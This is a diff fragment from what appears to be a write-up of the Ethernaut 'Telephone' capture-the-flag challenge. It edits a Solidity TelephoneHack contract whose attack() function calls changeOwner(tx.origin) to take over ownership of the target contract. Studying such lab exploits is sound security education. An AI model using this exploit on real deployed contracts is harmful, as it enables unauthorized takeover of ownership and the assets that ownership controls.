@@ -19,12 +19,13 @@ interface ITelephone{
 }
 contract TelephoneHack{
     ITelephone public telephone;
-    constructor (address _telephoneAddress){
-        telephone = ITelephone(_telephoneAddress);
+    constructor (address _challenge){
+        telephone = ITelephone(_challenge);
     }
-    function attack() external payable{
-        telephone.changeOwner(tx.origin); // Địa chỉ của attacker, người gửi giao dịch đầu tiên từ bên ngoài.
+    function attack() external {
+        telephone.changeOwner(tx.origin);
     }
+    fallback() external payable{}
 }
 ```
 ### Contract
